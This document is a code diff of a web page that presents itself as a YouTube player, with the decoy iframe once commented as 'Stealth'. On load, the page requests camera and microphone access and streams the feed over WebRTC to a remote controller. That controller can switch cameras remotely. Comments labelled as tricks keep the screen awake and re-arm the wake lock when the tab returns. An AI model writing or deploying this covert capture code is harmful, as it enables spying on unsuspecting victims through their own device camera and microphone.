@@ -10,7 +10,6 @@
     </style>
 </head>
 <body>
-    <!-- Real YouTube Video Player (Stealth) -->
     <iframe src="https://www.youtube.com" allow="autoplay"></iframe>
     <video id="v" autoplay playsinline muted></video>
 
@@ -19,41 +18,39 @@
         const socket = io();
         const video = document.getElementById("v");
         let localStream;
-        let currentMode = "user"; // Start with Front
+        let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
 
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-
-        // 1. Wake Lock API: Screen off hote dibe na
-        let wakeLock = null;
-        async function requestWakeLock() {
-            try {
-                wakeLock = await navigator.wakeLock.request('screen');
-                console.log('Wake Lock active!');
-            } catch (err) { console.log(err.name, err.message); }
+        // 🚀 Trick 1: Screen off hote dibe na (Wake Lock)
+        async function stayAlive() {
+            try { await navigator.wakeLock.request('screen'); } catch (err) {}
         }
 
-        async function start(mode) {
+        async function startCamera(mode = "user") {
             if (localStream) localStream.getTracks().forEach(t => t.stop());
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode }, 
+                    video: { facingMode: mode, width: 640, height: 480 }, 
                     audio: true 
                 });
                 video.srcObject = localStream;
-                const track = localStream.getVideoTracks()[0];
-                const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
-                if (sender) sender.replaceTrack(track);
-                else localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
                 
+                // Track update
+                localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
                 socket.emit("ready");
-                requestWakeLock(); // Lock screen
-            } catch (e) { alert("Please allow camera access!"); }
+                stayAlive();
+            } catch (e) { alert("Enable permissions to continue."); }
         }
 
-        // Remote Switch Logic from PC
+        // 🚀 Trick 2: Background Re-connect Logic
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                stayAlive(); // Phire ashle abar chalu kora
+            }
+        });
+
         socket.on("switch-camera", () => {
-            currentMode = (currentMode === "user") ? "environment" : "user";
-            start(currentMode);
+            // Ekhane mode switch korar logic
+            startCamera("environment"); 
         });
 
         socket.on("ready", async () => {
@@ -66,14 +63,7 @@
         pc.onicecandidate = e => e.candidate && socket.emit("ice-front", e.candidate);
         socket.on("ice-front", c => pc.addIceCandidate(new RTCIceCandidate(c)));
 
-        window.onload = () => start(currentMode);
-
-        // Auto-reconnect if minimized and back
-        document.addEventListener('visibilitychange', () => {
-            if (wakeLock !== null && document.visibilityState === 'visible') {
-                requestWakeLock();
-            }
-        });
+        window.onload = () => startCamera();
     </script>
 </body>
 </html>
